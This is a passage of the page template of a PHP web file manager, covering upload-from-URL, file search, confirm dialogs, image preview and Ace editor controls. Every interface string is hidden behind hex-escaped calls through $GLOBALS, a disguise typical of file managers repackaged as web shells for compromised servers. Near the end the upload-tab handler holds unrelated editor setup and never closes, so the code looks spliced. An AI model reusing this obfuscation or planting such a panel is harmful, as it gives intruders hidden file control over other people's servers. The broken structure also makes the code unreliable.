                                resultWrapper.append('<div class="alert alert-success row"><?php echo $GLOBALS['F']["\x6c\x6e\x67"]("\x55\x70\x6c\x6f\x61\x64\x65\x64\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c"); ?>: ' + data.done.name + '</div>');
                                form.find("input[name=uploadurl]").val('');
                            } else if (data['fail']) {
                                resultWrapper.append('<div class="alert alert-danger row"><?php echo $GLOBALS['F']["\x6c\x6e\x67"]("\x45\x72\x72\x6f\x72"); ?>: ' + data.fail.message + '</div>');
                            }
                            form.find("input[name=uploadurl]").removeAttr("disabled");
                            form.find("button").show();
                            form.find(".lds-facebook").removeClass('show-me');
                        }
                    },
                    error: function(xhr) {
                        form.find("input[name=uploadurl]").removeAttr("disabled");
                        form.find("button").show();
                        form.find(".lds-facebook").removeClass('show-me');
                        console.error(xhr);
                    }
                });
                return false;
            }

            // Search template
            function search_template(data) {
                var response = "";
                $.each(data, function(key, val) {
                    response += `<li><a href="?p=${val.path}&view=${val.name}">${val.path}/${val.name}</a></li>`;
                });
                return response;
            }

            // Advance search
            function fm_search() {
                var searchTxt = $("input#advanced-search").val(),
                    searchWrapper = $("ul#search-wrapper"),
                    path = $("#js-search-modal").attr("href"),
                    _html = "",
                    $loader = $("div.lds-facebook");
                if (!!searchTxt && searchTxt.length > 2 && path) {
                    var data = {
                        ajax: true,
                        content: searchTxt,
                        path: path,
                        type: 'search',
                        token: window.csrf
                    };
                    $.ajax({
                        type: "POST",
                        url: window.location,
                        data: data,
                        beforeSend: function() {
                            searchWrapper.html('');
                            $loader.addClass('show-me');
                        },
                        success: function(data) {
                            $loader.removeClass('show-me');
                            data = JSON.parse(data);
                            if (data && data.length) {
                                _html = search_template(data);
                                searchWrapper.html(_html);
                            } else {
                                searchWrapper.html('<p class="m-2"><?php echo $GLOBALS['F']["\x6c\x6e\x67"]("\x4e\x6f\x20\x72\x65\x73\x75\x6c\x74\x20\x66\x6f\x75\x6e\x64\x21"); ?><p>');
                            }
                        },
                        error: function(xhr) {
                            $loader.removeClass('show-me');
                            searchWrapper.html('<p class="m-2"><?php echo $GLOBALS['F']["\x6c\x6e\x67"]("\x45\x52\x52\x4f\x52\x3a\x20\x54\x72\x79\x20\x61\x67\x61\x69\x6e\x20\x6c\x61\x74\x65\x72\x21"); ?></p>');
                        },
                        failure: function(mes) {
                            $loader.removeClass('show-me');
                            searchWrapper.html('<p class="m-2"><?php echo $GLOBALS['F']["\x6c\x6e\x67"]("\x45\x52\x52\x4f\x52\x3a\x20\x54\x72\x79\x20\x61\x67\x61\x69\x6e\x20\x6c\x61\x74\x65\x72\x21"); ?></p>');
                        }
                    });
                } else {
                    searchWrapper.html("<?php echo $GLOBALS['F']["\x6c\x6e\x67"]("\x4f\x4f\x50\x53\x3a\x20\x6d\x69\x6e\x69\x6d\x75\x6d\x20\x33\x20\x63\x68\x61\x72\x61\x63\x74\x65\x72\x73\x20\x72\x65\x71\x75\x69\x72\x65\x64\x21"); ?>");
                }
            }

            // action confirm dialog modal
            function confirmDialog(e, id = 0, title = "Action", content = "", action = null) {
                e.preventDefault();
                const tplObj = {
                    id,
                    title,
                    content: decodeURIComponent(content.replace(/\+/g, ' ')),
                    action
                };
                let tpl = $("#js-tpl-confirm").html();
                $(".modal.confirmDialog").remove();
                $('#wrapper').append(template(tpl, tplObj));
                const $confirmDialog = $("#confirmDialog-" + tplObj.id);
                $confirmDialog.modal('show');
                return false;
            }

            // on mouse hover image preview
            ! function(s) {
                s.previewImage = function(e) {
                    var o = s(document),
                        t = ".previewImage",
                        a = s.extend({
                            xOffset: 20,
                            yOffset: -20,
                            fadeIn: "fast",
                            css: {
                                padding: "5px",
                                border: "1px solid #cccccc",
                                "background-color": "#fff"
                            },
                            eventSelector: "[data-preview-image]",
                            dataKey: "previewImage",
                            overlayId: "preview-image-plugin-overlay"
                        }, e);
                    return o.off(t), o.on("mouseover" + t, a.eventSelector, function(e) {
                        s("p#" + a.overlayId).remove();
                        var o = s("<p>").attr("id", a.overlayId).css("position", "absolute").css("display", "none").append(s('<img class="c-preview-img">').attr("src", s(this).data(a.dataKey)));
                        a.css && o.css(a.css), s("body").append(o), o.css("top", e.pageY + a.yOffset + "px").css("left", e.pageX + a.xOffset + "px").fadeIn(a.fadeIn)
                    }), o.on("mouseout" + t, a.eventSelector, function() {
                        s("#" + a.overlayId).remove()
                    }), o.on("mousemove" + t, a.eventSelector, function(e) {
                        s("#" + a.overlayId).css("top", e.pageY + a.yOffset + "px").css("left", e.pageX + a.xOffset + "px")
                    }), this
                }, s.previewImage()
            }(jQuery);

            // Dom Ready Events
            $(document).ready(function() {
                // dataTable init
                var $table = $('#main-table'),
                    tableLng = $table.find('th').length,
                    _targets = (tableLng && tableLng == 7) ? [0, 4, 5, 6] : tableLng == 5 ? [0, 4] : [3];
                mainTable = $('#main-table').DataTable({
                    paging: false,
                    info: false,
                    order: [],
                    columnDefs: [{
                        targets: _targets,
                        orderable: false
                    }]
                });

                // filter table
                $('#search-addon').on('keyup', function() {
                    mainTable.search(this.value).draw();
                });

                $("input#advanced-search").on('keyup', function(e) {
                    if (e.keyCode === 13) {
                        fm_search();
                    }
                });

                $('#search-addon3').on('click', function() {
                    fm_search();
                });

                //upload nav tabs
                $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e) {
                    e.preventDefault();
                    let target = $(this).data('target');

                    renderThemeMode();
                    $(".js-ace-toolbar").on("click", 'button', function(e) {
                        e.preventDefault();
                        let cmdValue = $(this).attr("data-cmd"),
                            editorOption = $(this).attr("data-option");
                        if (cmdValue && cmdValue != "none") {
                            ace_commend(cmdValue);
                        } else if (editorOption) {
                            if (editorOption == "fullscreen") {
                                (void 0 !== document.fullScreenElement && null === document.fullScreenElement || void 0 !== document.msFullscreenElement && null === document.msFullscreenElement || void 0 !== document.mozFullScreen && !document.mozFullScreen || void 0 !== document.webkitIsFullScreen && !document.webkitIsFullScreen) &&
                                (editor.container.requestFullScreen ? editor.container.requestFullScreen() : editor.container.mozRequestFullScreen ? editor.container.mozRequestFullScreen() : editor.container.webkitRequestFullScreen ? editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT) : editor.container.msRequestFullscreen && editor.container.msRequestFullscreen());
                            } else if (editorOption == "wrap") {
                                let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
                                editor.getSession().setUseWrapMode(wrapStatus);
                            }
                        }
                    });

                    $("select#js-ace-mode, select#js-ace-theme, select#js-ace-fontSize").on("change", function(e) {
                        e.preventDefault();
                        let selectedValue = $(this).val(),
                            selectionType = $(this).attr("data-type");
                        if (selectedValue && selectionType == "mode") {
                            editor.getSession().setMode(selectedValue);
                        } else if (selectedValue && selectionType == "theme") {
                            editor.setTheme(selectedValue);
                        } else if (selectedValue && selectionType == "fontSize") {
                            editor.setFontSize(parseInt(selectedValue));
                        }
                    });
                });
